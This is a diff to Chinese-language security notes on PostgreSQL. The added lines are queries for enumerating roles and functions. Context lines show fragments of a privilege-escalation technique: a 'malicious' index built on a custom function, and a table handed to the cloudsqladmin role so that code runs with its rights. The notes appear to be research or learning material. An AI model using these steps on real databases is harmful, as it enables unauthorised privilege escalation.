@@ -16,6 +16,58 @@ docker pull postgres:10.0
 docker run --name my_postgres -e POSTGRES_PASSWORD=123456 -d -p 5432:5432 postgres:10.0
 ```
 
+### 信息收集涉及的语句
+
+#### 用户组、用户
+
+```
+SELECT r.rolname AS role_name,
+       CASE
+           WHEN r.rolsuper THEN 'Superuser'
+           WHEN r.rolcreaterole THEN 'Create role'
+           WHEN r.rolcreatedb THEN 'Create DB'
+           WHEN r.rolcanlogin THEN 'Can login'
+           WHEN r.rolreplication THEN 'Replication'
+           WHEN r.rolconnlimit!= -1 THEN 'Conn limit: ' || r.rolconnlimit
+           WHEN r.rolpassword IS NOT NULL THEN 'Has password'
+           WHEN r.rolvaliduntil IS NOT NULL THEN 'Valid until: ' || r.rolvaliduntil
+           WHEN r.rolbypassrls THEN 'Bypass RLS'
+           ELSE ''
+       END AS attributes,
+       ARRAY_AGG(rm.rolname) AS member_of
+FROM pg_roles r
+LEFT JOIN pg_auth_members m ON r.oid = m.roleid
+LEFT JOIN pg_roles rm ON m.member = rm.oid
+GROUP BY r.rolname, r.rolsuper, r.rolcreaterole, r.rolcreatedb, r.rolcanlogin, r.rolreplication, r.rolconnlimit, r.rolpassword, r.rolvaliduntil, r.rolbypassrls
+ORDER BY r.rolname;
+```
+
+#### 函数
+
+查看public下的函数
+
+```
+SELECT proname AS function_name,
+       proargtypes AS argument_data_types,
+       prorettype AS result_data_type,
+       proisagg AS is_aggregate,
+       proiswindow AS is_window_function
+FROM pg_proc
+WHERE pronamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public');
+```
+
+查看函数代码
+
+```
+SELECT pg_get_functiondef('public.sum'::regproc);
+```
+
+```
+SELECT prosrc
+FROM pg_proc
+WHERE proname = 'sum';
+```
+
 ## 高权限自定义函数问题
 
 创建危险函数
@@ -141,7 +193,9 @@ INSERT INTO public.test3(data) VALUES(current_user);
 
 然后执行刷新 触发索引
 
-身份变为用户组
+用户组权限执行索引函数
+
+查看自己所在的用户组
 
 ```
 CREATE TABLE temp_table (data text); 
@@ -156,7 +210,7 @@ CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
 CREATE INDEX index_malicious ON public.temp_table (suid_function(data));
 
 /*
-自己要在cloudsqladmin里面
+自己要在cloudsqladmin这个role里面
 */
  
 ALTER TABLE temp_table OWNER TO cloudsqladmin;
